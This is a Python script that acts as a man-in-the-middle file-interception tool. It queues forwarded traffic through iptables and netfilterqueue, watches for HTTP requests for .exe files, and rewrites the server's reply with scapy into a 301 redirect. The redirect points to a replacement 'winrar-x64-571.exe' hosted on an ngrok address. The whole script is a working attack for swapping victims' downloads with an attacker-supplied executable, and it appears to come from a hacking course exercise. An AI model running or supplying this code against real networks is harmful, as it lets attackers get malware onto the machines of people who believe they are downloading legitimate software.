#!/usr/bin/env python

# iptables -I FORWARD -j NFQUEUE --queue-num 0
# to delete the iptables rule... iptables --flush

import netfilterqueue
import subprocess
import scapy.all as scapy
import optparse

# def get_arguement():
#     parser = optparse.OptionParser()
#     parser.add_option("-t","--target",dest="target",help="Target website")
#     (options,args) = parser.parse_args()
#     return options

subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"]) # FORWARD chain for packets going through the box, INPUT for packets coming into the box, OUTPUT for packets going out of the box.
#subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"]) # FORWARD chain for packets going through the box, INPUT for packets coming into the box, OUTPUT for packets going out of the box.

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    # option = get_arguement()
    # target = option.target
    scapy_packet = scapy.IP(packet.get_payload()) # convert the packet to a scapy packet
    if scapy_packet.haslayer(scapy.Raw): # DNSRR=DNS response, DNSRQ=DNS request
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print("[+] Downloading .exe file *************************")
                #print(scapy_packet.show())
        if scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing .exe file-----------------------------")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://609a1c4a.ngrok.io/winrar-x64-571.exe\n\n")
                packet.set_payload(str(modified_packet))
    packet.accept() # forward the packet to target or packet.drop() to drop the packet

# option = get_arguement()
# target = option.target
# if not target:
#     print("Enter target using -t.\n-h for help menu")
#     exit()
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    subprocess.call(["iptables", "--flush"])
    print("\niptables rules are deleted")